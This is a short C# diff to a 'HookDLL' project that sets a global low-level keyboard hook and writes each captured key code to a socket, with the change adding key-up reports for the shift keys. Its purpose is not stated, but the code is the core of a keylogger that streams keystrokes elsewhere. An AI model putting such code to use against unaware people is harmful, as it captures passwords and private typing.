@@ -24,6 +24,7 @@ namespace HookDLL
         public delegate IntPtr LLKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x100;
+        private const int WM_KEYUP = 0x0101;
         private static LLKeyboardProc _proc;
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool _disposed = false;
@@ -66,6 +67,14 @@ namespace HookDLL
                 int vkCode = Marshal.ReadInt32(lParam);
                 SocketWriter.WriteToSocket(vkCode.ToString());
                 //_log.HandleVK(vkCode, docPath, _ui);
+            }
+            else if (nCode >= 0 && wParam == (IntPtr)WM_KEYUP)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                if (vkCode == 0xA0 || vkCode == 0xA1)//VK_SHIFT = 0x10
+                {
+                    SocketWriter.WriteToSocket(vkCode.ToString());
+                }
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
